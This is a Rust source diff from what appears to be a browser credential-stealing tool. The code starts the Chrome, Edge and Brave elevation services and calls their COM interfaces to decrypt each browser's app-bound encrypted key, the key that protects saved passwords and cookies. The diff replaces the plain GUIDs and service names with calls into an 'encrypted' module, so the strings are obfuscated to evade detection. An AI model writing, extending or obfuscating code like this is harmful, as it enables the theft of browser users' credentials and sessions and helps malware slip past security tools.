@@ -295,16 +295,18 @@ unsafe fn try_one(clsid: &[u8], iid: &[u8], enc: &[u8], slots: &[usize]) -> Resu
 
 struct BrowserEntry {
     name: &'static str,
-    clsid_hex: &'static str,
-    iids_hex: &'static [&'static str],
+    clsid_fn: fn() -> String,
+    iids_fns: &'static [fn() -> String],
     slots: &'static [usize],
-    service: &'static str,
+    service_fn: fn() -> String,
 }
 
+use crate::encrypted::*;
+
 static BROWSERS: &[BrowserEntry] = &[
-    BrowserEntry { name: "Chrome", clsid_hex: "708860E0-F641-4611-8895-7D867DD3675B", iids_hex: &["1BF5208B-295F-4992-B5F4-3A9BB6494838", "463ABECF-410D-407F-8AF5-0DF35A005CC8"], slots: &[5, 6, 7, 8], service: "GoogleChromeElevationService" },
-    BrowserEntry { name: "Edge", clsid_hex: "1FCBE96C-1697-43AF-9140-2897C7C69767", iids_hex: &["8F7B6792-784D-4047-845D-1782EFBEF205", "C9C2B807-7731-4F34-81B7-44FF7779522B"], slots: &[5, 6, 7, 8], service: "MicrosoftEdgeElevationService" },
-    BrowserEntry { name: "Brave", clsid_hex: "576B31AF-6369-4B6B-8560-E4B203A97A8B", iids_hex: &["F396861E-0C8E-4C71-8256-2FAE6D759C9E"], slots: &[5, 6, 7, 8], service: "BraveElevationService" },
+    BrowserEntry { name: "Chrome", clsid_fn: s_elev_chrome_clsid, iids_fns: &[s_elev_chrome_iid1, s_elev_chrome_iid2], slots: &[5, 6, 7, 8], service_fn: s_elev_chrome_svc },
+    BrowserEntry { name: "Edge",   clsid_fn: s_elev_edge_clsid,   iids_fns: &[s_elev_edge_iid1,   s_elev_edge_iid2],   slots: &[5, 6, 7, 8], service_fn: s_elev_edge_svc   },
+    BrowserEntry { name: "Brave",  clsid_fn: s_elev_brave_clsid,  iids_fns: &[s_elev_brave_iid1],                       slots: &[5, 6, 7, 8], service_fn: s_elev_brave_svc  },
 ];
 
 fn hex_to_guid_bytes(hex: &str) -> Vec<u8> {
@@ -349,13 +351,16 @@ fn try_decrypt_inner(encrypted_key: &[u8]) -> Option<Vec<u8>> {
     install_veh();
 
     for b in BROWSERS {
-        start_service(b.service);
+        let svc = (b.service_fn)();
+        start_service(&svc);
         std::thread::sleep(std::time::Duration::from_millis(400));
 
-        let clsid = hex_to_guid_bytes(b.clsid_hex);
+        let clsid_s = (b.clsid_fn)();
+        let clsid = hex_to_guid_bytes(&clsid_s);
 
-        for iid_hex in b.iids_hex {
-            let iid = hex_to_guid_bytes(iid_hex);
+        for iid_fn in b.iids_fns {
+            let iid_s = iid_fn();
+            let iid = hex_to_guid_bytes(&iid_s);
             if iid.len() != 16 { continue; }
             match unsafe { try_one(&clsid, &iid, encrypted_key, b.slots) } {
                 Ok(key) => {
